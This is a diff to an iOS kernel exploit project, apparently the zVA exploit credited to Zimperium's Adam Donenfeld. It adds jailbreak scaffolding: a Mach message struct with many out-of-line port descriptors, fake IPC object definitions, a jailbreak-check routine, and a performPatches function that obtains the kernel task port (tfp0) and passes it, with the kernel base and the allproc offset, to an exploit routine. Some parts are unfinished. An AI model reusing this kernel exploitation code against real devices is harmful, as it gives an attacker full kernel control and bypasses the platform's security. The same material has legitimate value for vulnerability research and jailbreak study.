@@ -10,8 +10,44 @@
 #include "rwx.h"
 #include "post_exploit.h"
 #include "task_ports.h"
-
+#import <mach-o/loader.h>
+#import <sys/mman.h>
+#import <pthread.h>
+#undef __IPHONE_OS_VERSION_MIN_REQUIRED
+#include <sys/utsname.h>
 #define KERNEL_MAGIC 							(0xfeedfacf)
+
+extern uint64_t procoff;
+
+typedef struct {
+    mach_msg_header_t head;
+    mach_msg_body_t msgh_body;
+    mach_msg_ool_ports_descriptor_t desc[256];
+    char pad[4096];
+} sprz;
+
+
+void jbCheck() {
+    init_offsets();
+    struct utsname u = { 0 };
+    uname(&u);
+    if (strstr(u.version, "MarijuanARM")) {
+        printf("Already Jailbroken.\n");
+    }
+}
+
+typedef natural_t not_natural_t;
+
+struct not_essers_ipc_object {
+    not_natural_t io_bits;
+    not_natural_t io_references;
+    char    io_lock_data[1337];
+};
+
+#define IO_BITS_ACTIVE 0x80000000
+#define	IKOT_TASK 2
+#define IKOT_IOKIT_CONNECT 29
+#define IKOT_CLOCK 25
 
 kern_return_t mach_vm_region
 (
@@ -33,9 +69,9 @@ kern_return_t mach_vm_region
 static
 void print_welcome_message() {
 	kern_return_t ret = KERN_SUCCESS;
-	DEBUG_LOG("Welcome to zVA! Zimperium's unsandboxed kernel exploit");
-	DEBUG_LOG("Credit goes to:");
-	DEBUG_LOG("\tAdam Donenfeld (@doadam) for heap info leak, kernel base leak, type confusion vuln and exploit.");
+	printf("Welcome to zVA! Zimperium's unsandboxed kernel exploit\n");
+	printf("Credit goes to: ");
+	printf("\tAdam Donenfeld (@doadam) for heap info leak, kernel base leak, type confusion vuln and exploit.\n");
 }
 
 
@@ -132,6 +168,19 @@ cleanup:
 	return ret;
 }
 
+char dt[128];
+void performPatches(mach_port_t tfp)
+{
+  uint64_t kernel_base = offsets_get_kernel_base(); //Still need to edit this 
+   mach_port_t pt = MACH_PORT_NULL;
+   if(tfp != MACH_PORT_NULL) {
+    task_get_special_port(tfp, 4, &pt); // get tfp0
+    void exploit(mach_port_t, uint64_t, uint64_t);
+    exploit(pt, kernel_base, allproc_offset);
+   } else {
+    printf("Failed passing tfp...\n");
+   }
+}
 
 
 
